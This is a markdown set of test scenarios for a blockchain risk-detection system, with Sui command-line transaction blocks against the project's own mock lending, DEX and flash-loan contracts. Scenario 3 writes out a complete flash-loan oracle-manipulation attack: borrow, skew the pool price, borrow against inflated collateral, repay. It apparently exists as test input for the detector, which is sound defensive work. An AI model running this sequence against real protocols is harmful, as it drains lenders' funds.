# Risk Detection System Test Scenarios

## Setup Environment

```bash
source .env

ATTACKER=$(sui client active-address)
USDC_TYPE="$PACKAGE_ID::usdc::USDC"
WETH_TYPE="$PACKAGE_ID::weth::WETH"
ATTACK_DEX_POOL=$DEX_POOL_WETH_USDC
ATTACK_MARKET=$MARKET_USDC
```

---

## Scenario 1: Simple Supply & Borrow (Benign)

**Description:** A normal user supplies collateral (WETH) and borrows a safe amount of USDC.
**Expected Result:** Risk Score < 30 (Safe).

```bash
MINT_AMOUNT=1000000000   # 10 WETH
BORROW_AMOUNT=1000000    # 1 USDC

sui client ptb \
    --move-call "$PACKAGE_ID::coin_factory::mint_weth" @$COIN_FACTORY_ID $MINT_AMOUNT \
    --assign weth_coin \
    --move-call "$PACKAGE_ID::compound_market::supply<$WETH_TYPE>" \
        @$MARKET_WETH weth_coin @0x6 \
    --assign position \
    --move-call "$PACKAGE_ID::compound_market::borrow<$WETH_TYPE, $USDC_TYPE>" \
        @$MARKET_WETH @$MARKET_USDC position @$DEX_POOL_WETH_USDC $BORROW_AMOUNT @0x6 \
    --assign usdc_loan \
    --transfer-objects "[position, usdc_loan]" @$ATTACKER \
    --gas-budget 50000000 --json
```

---

## Scenario 2: High Slippage Swap (Suspicious)

**Description:** A user executes a large swap that significantly impacts the DEX price, but does not exploit it.
**Expected Result:** Risk Score 30-70 (Warning: Price Volatility).

```bash
SWAP_AMOUNT=10000000000

sui client ptb \
    --move-call "$PACKAGE_ID::coin_factory::mint_usdc" @$COIN_FACTORY_ID $SWAP_AMOUNT \
    --assign swap_coin \
    --move-call "$PACKAGE_ID::simple_dex::swap_b_to_a<$WETH_TYPE,$USDC_TYPE>" \
        @$DEX_POOL_WETH_USDC swap_coin 0 \
    --assign weth_out \
    --transfer-objects "[weth_out]" @$ATTACKER \
    --gas-budget 50000000 --json
```

---

## Scenario 3: Oracle Manipulation Attack (Critical)

**Description:** The full attack vector: Flash Loan -> Manipulate Oracle Price -> Borrow with inflated collateral -> Repay Flash Loan.
**Expected Result:** Risk Score > 90 (Critical: Oracle Manipulation Detected).

```bash
FLASH_LOAN_AMOUNT=2500000000000
SWAP_AMOUNT=2000000000000
SUPPLY_AMOUNT=1000000000
BORROW_AMOUNT=1900000000000
REPAY_AMOUNT=2502250000000

sui client ptb \
    --assign flash_loan_amount $FLASH_LOAN_AMOUNT \
    --assign swap_amount $SWAP_AMOUNT \
    --assign supply_amount $SUPPLY_AMOUNT \
    --assign borrow_amount $BORROW_AMOUNT \
    --assign repay_amount $REPAY_AMOUNT \
    \
    --move-call "$PACKAGE_ID::flash_loan_pool::borrow_flash_loan<$USDC_TYPE>" \
        @"$FLASH_LOAN_POOL_USDC" flash_loan_amount \
    --assign loan_res \
    --assign loan_coin loan_res.0 \
    --assign receipt loan_res.1 \
    \
    --split-coins loan_coin "[swap_amount]" \
    --assign swap_coin \
    \
    --move-call "$PACKAGE_ID::simple_dex::swap_b_to_a<$WETH_TYPE,$USDC_TYPE>" \
        @"$ATTACK_DEX_POOL" swap_coin 0 \
    --assign weth_out \
    \
    --move-call "$PACKAGE_ID::compound_market::supply<$WETH_TYPE>" \
        @"$MARKET_WETH" weth_out @0x6 \
    --assign position \
    \
    --move-call "$PACKAGE_ID::compound_market::borrow<$WETH_TYPE,$USDC_TYPE>" \
        @"$MARKET_WETH" @"$ATTACK_MARKET" position @"$ATTACK_DEX_POOL" borrow_amount @0x6 \
    --assign borrowed_usdc \
    \
    --merge-coins loan_coin "[borrowed_usdc]" \
    \
    --split-coins loan_coin "[repay_amount]" \
    --assign repay_coin \
    \
    --move-call "$PACKAGE_ID::flash_loan_pool::repay_flash_loan<$USDC_TYPE>" \
        @"$FLASH_LOAN_POOL_USDC" repay_coin receipt \
    \
    --transfer-objects "[position, loan_coin]" @$ATTACKER \
    --gas-budget 100000000 --json
```
